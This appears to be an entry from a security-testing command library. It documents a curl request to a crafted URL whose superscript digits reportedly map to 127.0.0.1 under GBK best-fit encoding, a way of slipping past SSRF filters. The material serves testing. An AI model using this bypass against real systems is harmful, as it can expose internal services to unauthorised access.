---
id: cmd-uuid-001
data: 'curl -g ''http://¹²7.0.0.1'' -v -o /dev/null'
tags:
  - ssrf
  - curl
  - testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:02.501Z'
verified: false
validated: true
submitted: true
---
# curl-gbk-ssrf-test

## Command

```bash
curl -g 'http://¹²7.0.0.1' -v -o /dev/null
```

## Description

Tests SSRF in curl by sending a request to a crafted URL with superscript characters that map to localhost via GBK best-fit on Chinese systems.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-g` | Disables URL globbing for literal parsing | Yes |
| `-v` | Verbose mode to show connection and response details | Yes |
| `-o /dev/null` | Discards the response body | Yes |
| `http://¹²7.0.0.1` | Crafted URL exploiting encoding | Yes |

## Examples

### Basic Usage

```bash
curl -g 'http://¹²7.0.0.1' -v -o /dev/null
```

### Advanced Usage

Add headers if needed:

```bash
curl -g 'http://¹²7.0.0.1' -v -H 'User-Agent: Test' -o /dev/null
```

## Expected Output

Verbose logs showing resolution to 127.0.0.1:80, connection establishment, and HTTP 200 OK with body 'FindVuln' if server is running.

## Related

- [[commands/flask-simple-server]]
- [[procedures/Execute-Curl-with-Crafted-URL]]
